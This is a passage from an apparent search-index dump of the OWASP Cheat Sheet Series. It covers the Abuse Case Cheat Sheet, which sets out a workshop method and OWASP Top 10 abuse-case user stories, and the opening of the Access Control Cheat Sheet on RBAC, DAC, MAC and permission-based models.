from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks. Abuse Case: As an attacker, I include malicious XML code to exploit vulnerable code, dependencies or integrations to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack (e.g. Billion Laughs attack), as well as execute other attacks. A5:2017-Broken Access Control \u00b6 Epic: Exploitation of access control is a core skill of attackers. Access control is detectable using manual means, or possibly through automation for the absence of access controls in certain frameworks. Abuse Case: As an attacker, I bypass access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool. Abuse Case: As an attacker, I manipulate the primary key and change it to access another's users record, allowing viewing or editing someone else's account. Abuse Case: As an attacker, I manipulate sessions, access tokens, or other access controls in the application to act as a user without being logged in, or acting as an admin/privileged user when logged in as a user. Abuse Case: As an attacker, I leverage metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation. Abuse Case: As an attacker, I exploit Cross-Origin Resource Sharing CORS misconfiguration allowing unauthorized API access. Abuse Case: As an attacker, I force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Abuse Case: As an attacker, I access APIs with missing access controls for POST, PUT and DELETE. Abuse Case: As an attacker, I target default crypto keys in use, weak crypto keys generated or re-used, or keys where rotation missing is missing. Abuse Case: As an attacker, I find areas where the user agent (e.g. app, mail client) does not verify if the received server certificate is valid and perform attacks where I get unauthorized access to data. A6:2017-Security Misconfiguration \u00b6 Epic: Attackers will often attempt to exploit unpatched flaws or access default accounts, unused pages, unprotected files and directories, etc to gain unauthorized access or knowledge of the system. Abuse Case: As an attacker, I find and exploit missing appropriate security hardening configurations on any part of the application stack, or improperly configured permissions on cloud services. Abuse Case: As an attacker, I find unnecessary features which are enabled or installed (e.g. unnecessary ports, services, pages, accounts, or privileges) and attack or exploit the weakness. Abuse Case: As an attacker, I use default accounts and their passwords to access systems, interfaces, or perform actions on components which I should not be able to. Abuse Case: As an attacker, I find areas of the application where error handling reveals stack traces or other overly informative error messages I can use for further exploitation. Abuse Case: As an attacker, I find areas where upgraded systems, latest security features are disabled or not configured securely. Abuse Case: As an attacker, I find security settings in the application servers, application frameworks (e.g. Struts, Spring, ASP.NET), libraries, databases, etc. not set to secure values. Abuse Case: As an attacker, I find the server does not send security headers or directives or they are not set to secure values. A7:2017-Cross-Site Scripting (XSS) \u00b6 Epic: XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two-thirds of all applications. Abuse Case: As an attacker, I perform reflected XSS where the application or API includes unvalidated and unescaped user input as part of HTML output. My successful attack can allow the attacker to execution of arbitrary HTML and JavaScript in my victim's browser. Typically the victim will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar. Abuse Case: As an attacker, I perform stored XSS where the application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Abuse Case: As an attacker, I perform DOM XSS where JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page is vulnerable to DOM XSS. A8:2017-Insecure Deserialization \u00b6 Epic: Exploitation of deserialization is somewhat difficult, as off-the-shelf exploits rarely work without changes or tweaks to the underlying exploit code. Abuse Case: As an attacker, I find areas of the application and APIs where deserialization of hostile or tampered objects can be supplied. As a result, I can focus on an object and data structure related attacks where the attacker modifies application logic or achieves arbitrary remote code execution if there are classes available to the application that can change behavior during or after deserialization. Or I focus on data tampering attacks such as access-control-related attacks where existing data structures are used but the content is changed. A9:2017-Using Components with Known Vulnerabilities \u00b6 Epic: While it is easy to find already-written exploits for many known vulnerabilities, other vulnerabilities require concentrated effort to develop a custom exploit. Abuse Case: As an attacker, I find common open source or closed source packages with weaknesses and perform attacks against vulnerabilities and exploits which are disclosed A10:2017-Insufficient Logging & Monitoring \u00b6 Epic: Exploitation of insufficient logging and monitoring is the bedrock of nearly every major incident. Attackers rely on the lack of monitoring and timely response to achieve their goals without being detected. In 2016, identifying a breach took an average of 191 days so plenty of time for damage to be inflicted. Abuse Case: As an attacker, I attack an organization and the logs, monitoring systems, and teams do not see or respond to my attacks. Sources of the schemas \u00b6 All figures were created using https://www.draw.io/ site and exported (as PNG image) for integration into this article. All XML descriptor files for each schema are available below (using XML description, modification of the schema is possible using DRAW.IO site): Schemas descriptors archive","title":"Abuse Case"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#abuse-case-cheat-sheet","text":"","title":"Abuse Case Cheat Sheet"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#introduction","text":"Often when the security level of an application is mentioned in requirements, the following expressions are met: The application must be secure . The application must defend against all attacks targeting this category of application . The application must defend against attacks from the OWASP TOP 10 ... These security requirements are too generic, and thus useless for a development team... In order to build a secure application, from a pragmatic point of view, it is important to identify the attacks which the application must defend against, according to its business and technical context.","title":"Introduction"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#objective","text":"The objective of this cheat sheet is to provide an explanation of about what an Abuse Case is, why abuse cases are important when considering the security of an application, and further finally, to provide a proposal for a pragmatic approach to building a list of abuse cases and tracking them for every feature planned for implementation as part of an application. The cheat sheet may be used for this purpose regardless of the project methodology used (waterfall or agile). Important note about this Cheat Sheet: The main objective is to provide a pragmatic approach in order to allow a company or a project team to start building and handling the list of abuse cases and then customize the elements proposed to its context/culture in order to, finally, build its own method. This cheat sheet can be seen as a getting-started tutorial.","title":"Objective"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#context-approach","text":"","title":"Context &amp; approach"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#why-clearly-identify-the-attacks","text":"Clearly identifying the attacks against which the application must defend is essential in order to enable the following steps in a project or sprint: Evaluate the business risk for each of the identified attacks in order perform a selection according to the business risk and the project/sprint budget. Derive security requirements and add them into the project specification or sprint's user stories and acceptance criteria. Estimate the overhead of provision in the initial project/sprint charge that will be necessary to implement the countermeasures. About countermeasures: Allow the project team to define them, and to determine in which location they are appropriate (network, infrastructure, code...) to be located.","title":"Why clearly identify the attacks"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#notion-of-abuse-case","text":"In order to help build the list of attacks, the notion of Abuse Cases is helpful. An Abuse Case can be defined as: A way to use a feature that was not expected by the implementer, allowing an attacker to influence the feature or outcome of use of the feature based on the attacker action (or input). Synopsys define an Abuse Case like this: Misuse and abuse cases describe how users misuse or exploit the weaknesses of controls in software features to attack an application. This can lead to tangible business impact when a direct attack against business functionalities, which may bring in revenue or provide positive user experience, are attacked. Abuse cases can also be an effective way to drive security requirements that lead to proper protection of these critical business use cases. Synopsys source","title":"Notion of Abuse Case"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#how-to-define-the-list-of-abuse-cases","text":"There are many different ways to define the list of abuse cases for a feature (that can be mapped to a user story in agile projects). The project OWASP Open SAMM proposes the following approach in the Activity A of the Security Practice Threat Assessment for the Maturity level 2: Further considering the threats to the organization, conduct a more formal analysis to determine potential misuse or abuse of functionality. Typically, this process begins with identification of normal usage scenarios, e.g. use-case diagrams if available. If a formal abuse-case technique isn't used, generate a set of abuse-cases for each scenario by starting with a statement of normal usage and brainstorming ways in which the statement might be negated, in whole or in part. The simplest way to get started is to insert the word \"no\" or \"not\" into the usage statement in as many ways as possible, typically around nouns and verbs. Each usage scenario should generate several possible abuse-case statements. Further elaborate the abuse-case statements to include any application-specific concerns based on the business function of the software. The ultimate goal is for the completed set of abuse statements to form a model for usage patterns that should be disallowed by the software. If desired, these abuse cases can be combined with existing threat models. After initial creation, abuse-case models should be updated for active projects during the design phase. For existing projects, new requirements should be analyzed for potential abuse, and existing projects should opportunistically build abuse-cases for established functionality where practical. Open SAMM source: Threat Assessment Level 2 Activity A Another way to achieve the building of the list can be the following (more bottom-up and collaboratively oriented): Make a workshop that includes people with the following profiles: Business analyst : Will be the business key people that will describe each feature from a business point of view. Risk analyst : Will be the company's risk personnel that will evaluate the business risk from a proposed attack (sometimes it is the Business analyst depending on the company). Penetration tester : Will be the attacker that will propose attacks that they can perform on the business feature(s) in question. If the company does not have a person with this profile then it is possible to request the service of an external specialist. If possible, include 2 penetration testers with different backgrounds in order to increase the number of possible attacks that will be identified and considered. Technical leaders of the projects : Will be the project technical people and will allow technical exchange about attacks and countermeasures identified during the workshop. Quality assurance analyst or functional tester : Personnel that may have a good sense of how the application/functionality is intended to work (positive testing), not work (negative testing), and what things cause it to fail (failure cases). During this workshop (duration will depend on the size of the feature list, but 4 hours is a good start) all business features that will be part of the project or the sprint will be processed. The output of the workshop will be a list of attacks (abuse cases) for all business features. All abuse cases will have a risk rating that allows for filtering and prioritization. It is important to take into account Technical and Business kind of abuse cases and mark them accordingly. Example: Technical flagged abuse case: Add Cross Site Scripting injection into a comment input field. Business flagged abuse case: Ability to modify arbitrary the price of an article in an online shop prior to pass an order causing the user to pay a lower amount for the wanted article.","title":"How to define the list of Abuse Cases"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#when-to-define-the-list-of-abuse-cases","text":"On agile project, the definition workshop must be made after the meeting in which User Stories are included in a Sprint. In waterfall projects, the definition workshop must be made when the business feature to implements are identified and known by the business. Whatever the mode of project used (agile or waterfall), the abuse cases selected to be addressed must become security requirements in each feature specification section (waterfall) or User Story acceptance criteria (agile) in order to allow additional cost/effort evaluation, identification and implementation of the countermeasures. Each abuse case must have a unique identifier in order to allow tracking throughout the whole project/sprint (details about this point will be given in the proposal section). An example of unique ID format can be ABUSE_CASE_001 . The following figure provides an overview of the chaining of the different steps involved (from left to right):","title":"When to define the list of Abuse Cases"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#proposal","text":"The proposal will focus on the output of the workshop explained in the previous section.","title":"Proposal"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#step-1-preparation-of-the-workshop","text":"First, even if it seems obvious, the key business people must be sure to know, understand and be able to explain the business features that will be processed during the workshop. Secondly, create a new Microsoft Excel file (you can also use Google Sheets or any other similar software) with the following sheets (or tabs): FEATURES Will contain a table with the list of business features planned for the workshop. ABUSE CASES Will contain a table with all abuse cases identified during the workshop. COUNTERMEASURES Will contain a table with the list of possible countermeasures (light description) imagined for the abuse cases identified. This sheet is not mandatory, but it can be useful (for an abuse case to know), if a fix is easy to implement and then can impact the risk rating. Countermeasures can be identified by the AppSec profile during the workshop, because an AppSec person must be able to perform attacks but also to build or identify defenses (it is not always the case for the Pentester profile because this person's focus is generally on the attack side only, so, the combination Pentester + AppSec is very efficient to have a 360 degree view). This is the representation of each sheet along with an example of content that will be filled during the workshop: FEATURES sheet: Feature unique ID Feature name Feature short description FEATURE_001 DocumentUploadFeature Allow user to upload document along a message COUNTERMEASURES sheet: Countermeasure unique ID Countermeasure short description Countermeasure help/hint DEFENSE_001 Validate the uploaded file by loading it into a parser Use advice from the OWASP Cheat Sheet about file upload ABUSE CASES sheet: Abuse case unique ID Feature ID impacted Abuse case's attack description Attack referential ID (if applicable) CVSS V3 risk rating (score) CVSS V3 string Kind of abuse case Countermeasure ID applicable Handling decision (To Address or Risk Accepted) ABUSE_CASE_001 FEATURE_001 Upload Office file with malicious macro in charge of dropping a malware CAPEC-17 HIGH (7.7) CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:H Technical DEFENSE_001 To Address","title":"Step 1: Preparation of the workshop"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#step-2-during-the-workshop","text":"Use the spreadsheet to review all the features. For each feature, follow this flow: Key business people explain the current feature from a business point of view. Penetration testers propose and explain a set of attacks that they can perform against the feature. For each attack proposed: Appsec proposes a countermeasure and a preferred set up location (infrastructure, network, code, design...). Technical people give feedback about the feasibility of the proposed countermeasure. Penetration testers use the CVSS v3 (or other standard) calculator to determine a risk rating. (ex: CVSS V3 calculator ) Risk key people accept/increase/decrease the rating to have final one that match the real business impact for the company. Business, Risk and Technical key peoples find a consensus and filter the list of abuses for the current feature to keep the ones that must be addressed, and then flag them accordingly in the ABUSE CASES sheet ( if risk is accepted then add a comment to explain why ). Pass to next feature... If the presence of penetration testers is not possible then you can use the following references to identify the applicable attacks on your features: OWASP Automated Threats to Web Applications OWASP Testing Guide OWASP Mobile Testing Guide Common Attack Pattern Enumeration and Classification (CAPEC) Important note on attacks and countermeasure knowledge base(s): With the time and across projects, you will obtain your own dictionary of attacks and countermeasures that are applicable to the kind of application in your business domain. This dictionary will speed up the future workshops in a significant way. To promote the creation of this dictionary, you can, at the end of the project/sprint, gather the list of attacks and countermeasures identified in a central location (wiki, database, file...) that will be used during the next workshop in combination with input from penetration pesters.","title":"Step 2: During the workshop"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#step-3-after-the-workshop","text":"The spreadsheet contains (at this stage) the list of all abuse cases that must be handled and, potentially (depending on the capacity) corresponding countermeasures. Now, there are two remaining task: Key business people must update the specification of each feature (waterfall) or the User Story of each feature (agile) to include the associated abuse cases as Security Requirements (waterfall) or Acceptance Criteria (agile). Key technical people must evaluate the overhead in terms of charge/effort to take into account the countermeasure.","title":"Step 3: After the workshop"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#step-4-during-implementation-abuse-cases-handling-tracking","text":"In order to track the handling of all the abuse cases, the following approach can be used: If one or several abuse cases are handled at: Design, Infrastructure or Network level Make a note in the documentation or schema to indicate that This design/network/infrastructure takes into account the abuse cases ABUSE_CASE_001, ABUSE_CASE_002, ABUSE_CASE_xxx . Code level Put a special comment in the classes/scripts/modules to indicate that This class/module/script takes into account the abuse cases ABUSE_CASE_001, ABUSE_CASE_002, ABUSE_CASE_xxx . Dedicated annotation like @AbuseCase(ids={\"ABUSE_CASE_001\",\"ABUSE_CASE_002\"}) can be used to facilitate tracking and allow identification into integrated development environment. Using this way, it becomes possible (via some minor scripting) to identify where abuse cases are addressed.","title":"Step 4: During implementation - Abuse cases handling tracking"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#step-5-during-implementation-abuse-cases-handling-validation","text":"As abuse cases are defined, it is possible to put in place automated or manual validations to ensure that: All the selected abuse cases are handled. An abuse case is correctly/completely handled. Validations can be of the following kinds: Automated (run regularly at commit, daily or weekly in the Continuous Integration Jobs of the project): Custom audit rules in Static Application Security Testing (SAST) or Dynamic Application Security Testing (DAST) tools. Dedicated unit, integration or functional security oriented tests. ... Manual: Security code review between project's peers during the design or implementation. Provide the list of all abuse cases addressed to pentesters so that they may validate the protection efficiency for each abuse case during an intrusion test against the application (the pentester will validate that the attacks identified are no longer effective and will also try to find other possible attacks). ... Adding automated tests also allow teams to track that countermeasures against the abuse cases are still effective/in place during a maintenance or bug fixing phase of a project (to prevent accidental removal/disabling). It is also useful when a Continuous Delivery approach is used, to ensure that all abuse cases protections are in place before opening access to the application.","title":"Step 5: During implementation - Abuse cases handling validation"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#example-of-derivation-of-abuse-cases-as-user-stories","text":"The following section show an example of derivation of Abuse Cases as User Stories, here using the OWASP TOP 10 as input source. Threat Oriented Personas: Malicious User Abusive User Unknowing User","title":"Example of derivation of Abuse Cases as User Stories"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a12017-injection","text":"Epic: Almost any source of data can be an injection vector, environment variables, parameters, external and internal web services, and all types of users. Injection flaws occur when an attacker can send hostile data to an interpreter. Abuse Case: As an attacker, I will perform an injection attack (SQL, LDAP, XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries) against input fields of the User or API interfaces","title":"A1:2017-Injection"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a22017-broken-authentication","text":"Epic: Attackers have access to hundreds of millions of valid username and password combinations for credential stuffing, default administrative account lists, automated brute force, and dictionary attack tools. Session management attacks are well understood, particularly in relation to unexpired session tokens. Abuse Case: As an attacker, I have access to hundreds of millions of valid username and password combinations for credential stuffing. Abuse Case: As an attacker, I have default administrative account lists, automated brute force, and dictionary attack tools I use against login areas of the application and support systems. Abuse Case: As an attacker, I manipulate session tokens using expired and fake tokens to gain access.","title":"A2:2017-Broken Authentication"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a32017-sensitive-data-exposure","text":"Epic: Rather than directly attacking crypto, attackers steal keys, execute man-in-the-middle attacks, or steal clear text data off the server, while in transit, or from the user's client, e.g. browser. A manual attack is generally required. Previously retrieved password databases could be brute forced by Graphics Processing Units (GPUs). Abuse Case: As an attacker, I steal keys that were exposed in the application to get unauthorized access to the application or system. Abuse Case: As an attacker, I execute man-in-the-middle attacks to get access to traffic and leverage it to obtain sensitive data and possibly get unauthorized access to the application. Abuse Case: As an attacker, I steal clear text data off the server, while in transit, or from the user's client, e.g. browser to get unauthorized access to the application or system. Abuse Case: As an attacker, I find and target old or weak cryptographic algorithms by capturing traffic and breaking the encryption.","title":"A3:2017-Sensitive Data Exposure"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a42017-xml-external-entities-xxe","text":"Epic: Attackers can exploit vulnerable XML processors if they can upload XML or include hostile content in an XML document, exploiting vulnerable code, dependencies or integrations. Abuse Case: As an attacker, I exploit vulnerable areas of the application where the user or system can upload XML to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks. Abuse Case: As an attacker, I include hostile content in an XML document which is uploaded to the application or system to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack, as well as execute other attacks. Abuse Case: As an attacker, I include malicious XML code to exploit vulnerable code, dependencies or integrations to extract data, execute a remote request from the server, scan internal systems, perform a denial-of-service attack (e.g. Billion Laughs attack), as well as execute other attacks.","title":"A4:2017-XML External Entities (XXE)"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a52017-broken-access-control","text":"Epic: Exploitation of access control is a core skill of attackers. Access control is detectable using manual means, or possibly through automation for the absence of access controls in certain frameworks. Abuse Case: As an attacker, I bypass access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool. Abuse Case: As an attacker, I manipulate the primary key and change it to access another's users record, allowing viewing or editing someone else's account. Abuse Case: As an attacker, I manipulate sessions, access tokens, or other access controls in the application to act as a user without being logged in, or acting as an admin/privileged user when logged in as a user. Abuse Case: As an attacker, I leverage metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges or abusing JWT invalidation. Abuse Case: As an attacker, I exploit Cross-Origin Resource Sharing CORS misconfiguration allowing unauthorized API access. Abuse Case: As an attacker, I force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Abuse Case: As an attacker, I access APIs with missing access controls for POST, PUT and DELETE. Abuse Case: As an attacker, I target default crypto keys in use, weak crypto keys generated or re-used, or keys where rotation missing is missing. Abuse Case: As an attacker, I find areas where the user agent (e.g. app, mail client) does not verify if the received server certificate is valid and perform attacks where I get unauthorized access to data.","title":"A5:2017-Broken Access Control"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a62017-security-misconfiguration","text":"Epic: Attackers will often attempt to exploit unpatched flaws or access default accounts, unused pages, unprotected files and directories, etc to gain unauthorized access or knowledge of the system. Abuse Case: As an attacker, I find and exploit missing appropriate security hardening configurations on any part of the application stack, or improperly configured permissions on cloud services. Abuse Case: As an attacker, I find unnecessary features which are enabled or installed (e.g. unnecessary ports, services, pages, accounts, or privileges) and attack or exploit the weakness. Abuse Case: As an attacker, I use default accounts and their passwords to access systems, interfaces, or perform actions on components which I should not be able to. Abuse Case: As an attacker, I find areas of the application where error handling reveals stack traces or other overly informative error messages I can use for further exploitation. Abuse Case: As an attacker, I find areas where upgraded systems, latest security features are disabled or not configured securely. Abuse Case: As an attacker, I find security settings in the application servers, application frameworks (e.g. Struts, Spring, ASP.NET), libraries, databases, etc. not set to secure values. Abuse Case: As an attacker, I find the server does not send security headers or directives or they are not set to secure values.","title":"A6:2017-Security Misconfiguration"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a72017-cross-site-scripting-xss","text":"Epic: XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two-thirds of all applications. Abuse Case: As an attacker, I perform reflected XSS where the application or API includes unvalidated and unescaped user input as part of HTML output. My successful attack can allow the attacker to execution of arbitrary HTML and JavaScript in my victim's browser. Typically the victim will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar. Abuse Case: As an attacker, I perform stored XSS where the application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Abuse Case: As an attacker, I perform DOM XSS where JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page is vulnerable to DOM XSS.","title":"A7:2017-Cross-Site Scripting (XSS)"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a82017-insecure-deserialization","text":"Epic: Exploitation of deserialization is somewhat difficult, as off-the-shelf exploits rarely work without changes or tweaks to the underlying exploit code. Abuse Case: As an attacker, I find areas of the application and APIs where deserialization of hostile or tampered objects can be supplied. As a result, I can focus on an object and data structure related attacks where the attacker modifies application logic or achieves arbitrary remote code execution if there are classes available to the application that can change behavior during or after deserialization. Or I focus on data tampering attacks such as access-control-related attacks where existing data structures are used but the content is changed.","title":"A8:2017-Insecure Deserialization"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a92017-using-components-with-known-vulnerabilities","text":"Epic: While it is easy to find already-written exploits for many known vulnerabilities, other vulnerabilities require concentrated effort to develop a custom exploit. Abuse Case: As an attacker, I find common open source or closed source packages with weaknesses and perform attacks against vulnerabilities and exploits which are disclosed","title":"A9:2017-Using Components with Known Vulnerabilities"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#a102017-insufficient-logging-monitoring","text":"Epic: Exploitation of insufficient logging and monitoring is the bedrock of nearly every major incident. Attackers rely on the lack of monitoring and timely response to achieve their goals without being detected. In 2016, identifying a breach took an average of 191 days so plenty of time for damage to be inflicted. Abuse Case: As an attacker, I attack an organization and the logs, monitoring systems, and teams do not see or respond to my attacks.","title":"A10:2017-Insufficient Logging &amp; Monitoring"},{"location":"cheatsheets/Abuse_Case_Cheat_Sheet.html#sources-of-the-schemas","text":"All figures were created using https://www.draw.io/ site and exported (as PNG image) for integration into this article. All XML descriptor files for each schema are available below (using XML description, modification of the schema is possible using DRAW.IO site): Schemas descriptors archive","title":"Sources of the schemas"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html","text":"Access Control Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing clear, simple, actionable guidance for providing access control security in your applications. The objective is to guide developers, reviewers, designers, architects on designing, creating, and maintaining access controls in web applications. What is Access Control / Authorization \u00b6 Authorization is the process where requests to access a particular resource should be granted or denied. It should be noted that authorization is not equivalent to authentication - as these terms and their definitions are frequently confused. Authentication is providing and validating identity. The authorization includes the execution rules that determine which functionality and data the user (or Principal) may access, ensuring the proper allocation of access rights after authentication is successful. Web applications need access controls to allow users (with varying privileges) to use the application. They also need administrators to manage the application\u2019s access control rules and the granting of permissions or entitlements to users and other entities. Various access control design methodologies are available. To choose the most appropriate one, a risk assessment needs to be performed to identify threats and vulnerabilities specific to your application, so that the proper access control methodology is appropriate for your application. Access Control Policy \u00b6 Why do we need an access control policy for web development? The intention of having an access control policy is to ensure that security requirements are described clearly to architects, designers, developers and support teams, such that access control functionality is designed and implemented in a consistent manner. Role-Based Access Control (RBAC) \u00b6 In Role-Based Access Control (RBAC), access decisions are based on an individual's roles and responsibilities within the organization or user base. The process of defining roles is usually based on analyzing the fundamental goals and structure of an organization and is usually linked to the security policy. For instance, in a medical organization, the different roles of users may include those such as a doctor, nurse, attendant, patients, etc. These members require different levels of access in order to perform their functions, but also the types of web transactions and their allowed context vary greatly depending on the security policy and any relevant regulations (HIPAA, Gramm-Leach-Bliley, etc.). An RBAC access control framework should provide web application security administrators with the ability to determine who can perform what actions, when, from where, in what order, and in some cases under what relational circumstances. The advantages of using this methodology are: Roles are assigned based on organizational structure with emphasis on the organizational security policy Easy to use Easy to administer Built into most frameworks Aligns with security principles like segregation of duties and least privileges Problems that can be encountered while using this methodology: Documentation of the roles and accesses has to be maintained stringently. Multi-tenancy can not be implemented effectively unless there is a way to associate the roles with multi-tenancy capability requirements, e.g. OU in Active Directory There is a tendency for scope creep to happen, e.g. more accesses and privileges can be given than intended for. Or a user might be included in two roles if proper access reviews and subsequent revocation is not performed. Does not support data-based access control The areas of caution while using RBAC are: Roles must be only be transferred or delegated using strict sign-offs and procedures. When a user changes their role to another one, the administrator must make sure that the earlier access is revoked such that at any given point of time, a user is assigned to only those roles on a need to know basis. Assurance for RBAC must be carried out using strict access control reviews. Discretionary Access Control (DAC) \u00b6 Discretionary Access Control (DAC) is a means of restricting access to information based on the identity of users and/or membership in certain groups. Access decisions are typically based on the authorizations granted to a user based on the credentials they presented at the time of authentication (user name, password, hardware/software token, etc.). In most typical DAC models, the owner of the information or any resource can change its permissions at their discretion (thus the name). A DAC framework can provide web application security administrators with the ability to implement fine-grained access control. This model can be a basis for data-based access control implementation The advantages of using this model are: Easy to use Easy to administer Aligns to the principle of least privileges. Object owner has total control over access granted Problems that can be encountered while using this methodology: Documentation of the roles and accesses has to be maintained stringently. Multi-tenancy can not be implemented effectively unless there is a way to associate the roles with multi-tenancy capability requirements, e.g. OU in Active Directory There is a tendency for scope creep to happen, e.g. more accesses and privileges can be given than intended for. The areas of caution while using DAC are: While granting trusts Assurance for DAC must be carried out using strict access control reviews. Mandatory Access Control (MAC) \u00b6 Mandatory Access Control (MAC) ensures that the enforcement of organizational security policy does not rely on voluntary web application user compliance. MAC secures information by assigning sensitivity labels on information and comparing this to the level of sensitivity a user is operating at. MAC is usually appropriate for extremely secure systems, including multilevel secure military applications or mission-critical data applications. The advantages of using this methodology are: Access to an object is based on the sensitivity of the object Access based on the need to know is strictly adhered to, and scope creep has minimal possibility Only an administrator can grant access Problems that can be encountered while using this methodology: Difficult and expensive to implement Not agile The areas of caution while using MAC are: Classification and sensitivity assignment at an appropriate and pragmatic level Assurance for MAC must be carried out to ensure that the classification of the objects is at the appropriate level. Permission Based Access Control \u00b6 The key concept in Permission Based Access Control is the abstraction of application actions into a set of permissions . A permission may be represented simply as a string-based name, for example, \"READ\". Access decisions are made by checking if the current user has the permission associated with the requested application action. The has relationship between the user and permission may be satisfied by creating a direct relationship between the user and permission (called a grant ), or an indirect one. In the indirect model, the permission grant is to an intermediate entity such as user group . A user is considered a member of a user group if and only if the user inherits permissions from the user group . The indirect model makes it easier to manage the permissions for a large number of users since changing the permissions assigned to the user group affects all members of the user group. In some Permission Based Access Control systems that provide fine-grained domain object-level access control, permissions may be grouped into classes . In this model, it is assumed that each domain object in the system can be associated with a class which determines the permissions applicable to the respective domain object. In such a system a \"DOCUMENT\" class may be defined with the permissions \"READ\", \"WRITE\" and DELETE\"; a \"SERVER\" class may be defined with the permissions \"START\", \"STOP\", and \"REBOOT\".","title":"Access Control"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#access-control-cheat-sheet","text":"","title":"Access Control Cheat Sheet"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#introduction","text":"This article is focused on providing clear, simple, actionable guidance for providing access control security in your applications. The objective is to guide developers, reviewers, designers, architects on designing, creating, and maintaining access controls in web applications.","title":"Introduction"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#what-is-access-control-authorization","text":"Authorization is the process where requests to access a particular resource should be granted or denied. It should be noted that authorization is not equivalent to authentication - as these terms and their definitions are frequently confused. Authentication is providing and validating identity. The authorization includes the execution rules that determine which functionality and data the user (or Principal) may access, ensuring the proper allocation of access rights after authentication is successful. Web applications need access controls to allow users (with varying privileges) to use the application. They also need administrators to manage the application\u2019s access control rules and the granting of permissions or entitlements to users and other entities. Various access control design methodologies are available. To choose the most appropriate one, a risk assessment needs to be performed to identify threats and vulnerabilities specific to your application, so that the proper access control methodology is appropriate for your application.","title":"What is Access Control / Authorization"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#access-control-policy","text":"Why do we need an access control policy for web development? The intention of having an access control policy is to ensure that security requirements are described clearly to architects, designers, developers and support teams, such that access control functionality is designed and implemented in a consistent manner.","title":"Access Control Policy"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#role-based-access-control-rbac","text":"In Role-Based Access Control (RBAC), access decisions are based on an individual's roles and responsibilities within the organization or user base. The process of defining roles is usually based on analyzing the fundamental goals and structure of an organization and is usually linked to the security policy. For instance, in a medical organization, the different roles of users may include those such as a doctor, nurse, attendant, patients, etc. These members require different levels of access in order to perform their functions, but also the types of web transactions and their allowed context vary greatly depending on the security policy and any relevant regulations (HIPAA, Gramm-Leach-Bliley, etc.). An RBAC access control framework should provide web application security administrators with the ability to determine who can perform what actions, when, from where, in what order, and in some cases under what relational circumstances. The advantages of using this methodology are: Roles are assigned based on organizational structure with emphasis on the organizational security policy Easy to use Easy to administer Built into most frameworks Aligns with security principles like segregation of duties and least privileges Problems that can be encountered while using this methodology: Documentation of the roles and accesses has to be maintained stringently. Multi-tenancy can not be implemented effectively unless there is a way to associate the roles with multi-tenancy capability requirements, e.g. OU in Active Directory There is a tendency for scope creep to happen, e.g. more accesses and privileges can be given than intended for. Or a user might be included in two roles if proper access reviews and subsequent revocation is not performed. Does not support data-based access control The areas of caution while using RBAC are: Roles must be only be transferred or delegated using strict sign-offs and procedures. When a user changes their role to another one, the administrator must make sure that the earlier access is revoked such that at any given point of time, a user is assigned to only those roles on a need to know basis. Assurance for RBAC must be carried out using strict access control reviews.","title":"Role-Based Access Control (RBAC)"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#discretionary-access-control-dac","text":"Discretionary Access Control (DAC) is a means of restricting access to information based on the identity of users and/or membership in certain groups. Access decisions are typically based on the authorizations granted to a user based on the credentials they presented at the time of authentication (user name, password, hardware/software token, etc.). In most typical DAC models, the owner of the information or any resource can change its permissions at their discretion (thus the name). A 